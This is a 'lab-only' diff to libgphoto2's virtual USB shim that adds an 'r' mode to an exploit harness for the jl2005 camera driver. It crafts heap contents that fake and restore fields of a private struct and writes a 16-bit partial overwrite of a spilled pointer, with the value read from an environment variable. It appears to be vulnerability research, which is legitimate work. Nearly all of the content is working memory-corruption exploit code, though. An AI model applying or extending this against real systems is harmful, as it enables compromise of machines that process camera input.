@@ -1,0 +1,54 @@
+# W193 lab-only vusb diff, relative to the W192 clang tree after
+# live/vusb-jl2005.patch, evidence/replay-vusb-local-modes.patch and
+# evidence/replay-vusb-ret.patch. Mode r supplies only a 16-bit partial
+# value for the spilled priv pointer; it never supplies a full address.
+--- a/libgphoto2_port/vusb/vusb.c
++++ b/libgphoto2_port/vusb/vusb.c
+@@ -169,5 +169,20 @@
+ 			bytes[6] = 0x43;
+ 			bytes[12] = (char)((count >> 8) & 0xff);
+ 			bytes[13] = (char)(count & 0xff);
++			if (m2[0] == 'r') {
++				/* On a matching 4-bit heap guess, :154 starts at
++				 * priv-0x190. These source bytes initialize the real
++				 * private struct; the direct probe stops before any
++				 * post-corruption allocation. */
++				bytes[0x70] = 0x43; /* fake priv->model */
++				bytes[0x1c0] = 0x43; /* real priv->model */
++				bytes[0x1c8] = 0x00; /* blocksize = 0x200 */
++				bytes[0x1c9] = 0x02;
++				bytes[0x1cc] = 0x01; /* nb_entries = 1 */
++				bytes[0x1d8] = 0x00; /* total_data = 0x200 */
++				bytes[0x1d9] = 0x02;
++				bytes[0x1e0] = 0x00; /* data_to_read = 0x200 */
++				bytes[0x1e1] = 0x02;
++			}
+ 			return size;
+ 		}
+@@ -174,4 +189,5 @@
+			int n = size;
+			if (m2[0] == 's' && n > 0x3E20) n = 0x3E20;
++			if (m2[0] == 'r' && n > 0x3E32) n = 0x3E32;
+ 			if (m2[0] == 'p') {
+ 				const char *ls = getenv("M2SHELL_JL2005_LEN");
+@@ -180,6 +196,20 @@
+				if (n > lim) n = lim;
+			}
+			memset(bytes, 0x5a, (size_t)n);
++			if (m2[0] == 'r' && n >= 0x3E32) {
++				const char *ps = getenv("M2SHELL_JL2005_PRIV16");
++				unsigned int v = ps ? (unsigned int)strtoul(ps, NULL, 0) : 0;
++				/* One safe 0x200-byte table entry; bytes 0..3
++				 * carry the direct-readback marker. */
++				memcpy(bytes, "W193", 4);
++				bytes[6] = 0x00;
++				bytes[7] = 0x01;
++				bytes[8] = bytes[9] = 0;
++				bytes[12] = bytes[13] = 0;
++				bytes[0x3E30] = (char)(v & 0xff);
++				bytes[0x3E31] = (char)((v >> 8) & 0xff);
++				fprintf(stderr, "VUSB_PARTIAL=%04x n=%d\n", v & 0xffff, n);
++			}
+ 			if (m2[0] == 'p') {
+ 				const char *ts = getenv("M2SHELL_JL2005_TOP");
+ 				if (ts && n >= 0x3E38) {
